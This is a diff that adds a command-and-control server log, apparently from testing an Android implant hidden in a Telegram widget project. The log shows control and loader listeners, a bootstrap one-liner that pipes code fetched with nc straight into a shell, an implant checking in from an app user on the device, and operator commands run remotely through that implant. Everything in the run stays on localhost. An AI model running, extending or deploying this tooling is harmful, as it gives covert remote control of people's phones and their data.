@@ -1,0 +1,52 @@
+[2026-11-07 19:55:27] control listening on 127.0.0.1:4444
+[2026-11-07 19:55:27] loader listening on 127.0.0.1:5555
+[2026-11-07 19:55:27] logs: <HOME>/ailocal/Telegram/telegramandroidwidget/c2/logs/run-20261107-195527
+[2026-11-07 19:55:27] downloads: <HOME>/ailocal/Telegram/telegramandroidwidget/c2/downloads
+[2026-11-07 19:55:27] bootstrap: setsid sh -c 'sleep 5|nc 127.0.0.1 5555|sh'&
+[*] waiting up to 180s for a session...
+[2026-11-07 19:55:41] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:41] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:42] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:42] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:42] session 1 hello implant=tg-10346-XQ-BT52 uid=10346 user=u0_a346 device=XQ-BT52 pid= build=0b76aaf09f900cf3 from=127.0.0.1
+[+] session 1: tg-10346-XQ-BT52 (u0_a346@XQ-BT52) from 127.0.0.1
+>>> sessions
+  SID  ST  IMPLANT              UID     DEVICE             PID    PEER
+     1  up  tg-10346-XQ-BT52    10346   XQ-BT52                   127.0.0.1
+>>> exec id
+[2026-11-07 19:55:42] session 1 exec [tg-10346-XQ-BT52]: id
+[2026-11-07 19:55:42] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:42] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:43] loader: serving 39787 bytes to 127.0.0.1
+uid=10346(u0_a346) gid=10346(u0_a346) groups=10346(u0_a346),3002(net_bt),3003(inet),9997(everybody),20346(u0_a346_cache),50346(all_a346) context=u:r:untrusted_app:s0:c90,c257,c512,c768
+[exec rc=0 1.13s]
+>>> exec getprop ro.build.version.release
+[2026-11-07 19:55:43] session 1 exec [tg-10346-XQ-BT52]: getprop ro.build.version.release
+[2026-11-07 19:55:43] loader: serving 39787 bytes to 127.0.0.1
+13
+[2026-11-07 19:55:43] loader: serving 39787 bytes to 127.0.0.1
+[exec rc=0 0.33s]
+>>> pause 15
+[2026-11-07 19:55:44] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:44] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:44] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:45] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:45] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:45] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:45] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:46] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:46] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:46] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:47] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:47] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:47] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:48] loader: serving 39787 bytes to 127.0.0.1
+[2026-11-07 19:55:49] session 1 closed (peer closed)
+[2026-11-07 19:55:53] session 2 hello implant=tg-10346-XQ-BT52 uid=10346 user=u0_a346 device=XQ-BT52 pid= build=0b76aaf09f900cf3 from=127.0.0.1
+[2026-11-07 19:55:53] pruned 1 dead session(s)
+[+] session 2: tg-10346-XQ-BT52 (u0_a346@XQ-BT52) from 127.0.0.1
+>>> bye stop
+[bye] tg-10346-XQ-BT52 stop=1
+[2026-11-07 19:55:59] session 2 closed (peer closed)
+>>> quit
+[2026-11-07 19:55:59] server stopped
